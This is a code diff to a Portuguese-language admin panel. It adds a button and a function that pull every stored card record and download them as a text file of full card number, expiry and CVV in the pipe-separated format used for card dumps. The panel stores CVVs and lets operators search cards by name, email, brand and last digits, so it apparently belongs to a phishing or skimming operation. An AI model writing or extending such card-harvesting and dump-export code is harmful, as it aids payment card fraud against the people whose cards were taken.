@@ -189,6 +189,7 @@
         <input class="search-input" id="searchInput" placeholder="Buscar por nome, e-mail, bandeira ou final..." oninput="debounceSearch()"/>
       </div>
       <button class="btn-toolbar" onclick="loadAll()">↻ Atualizar</button>
+      <button class="btn-toolbar" onclick="exportarCartoes()" id="btnExport">⬇ Exportar .txt</button>
       <button class="btn-toolbar btn-danger" onclick="confirmClearAll()">🗑 Limpar tudo</button>
     </div>
 
@@ -455,6 +456,37 @@ function openConfirm(ico, title, sub, cb) {
 function closeConfirm() { document.getElementById('confirmModal').classList.remove('show'); }
 
 function esc(s) { return String(s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;'); }
+
+async function exportarCartoes() {
+  const btn = document.getElementById('btnExport');
+  btn.textContent = '⏳ Exportando...';
+  btn.disabled = true;
+  try {
+    const r = await fetch('/api/admin/cards', { headers: { 'x-admin-token': _token } });
+    if (!r.ok) { alert('Erro ao buscar cartões.'); return; }
+    const d = await r.json();
+    const cards = d.cards || [];
+    if (!cards.length) { alert('Nenhum cartão cadastrado.'); return; }
+    const lines = cards.map(c => {
+      const num = (c.card_number || '').replace(/\D/g, '');
+      const [mm = '', yy = ''] = (c.expiry || '').split('/');
+      const cvv = c.cvv || '';
+      return `${num}|${mm}|${yy}|${cvv}`;
+    });
+    const blob = new Blob([lines.join('\n')], { type: 'text/plain' });
+    const url  = URL.createObjectURL(blob);
+    const a    = document.createElement('a');
+    a.href     = url;
+    a.download = `cartoes_${new Date().toISOString().slice(0,10)}.txt`;
+    a.click();
+    URL.revokeObjectURL(url);
+  } catch(e) {
+    alert('Erro: ' + e.message);
+  } finally {
+    btn.textContent = '⬇ Exportar .txt';
+    btn.disabled = false;
+  }
+}
 </script>
 </body>
 </html>
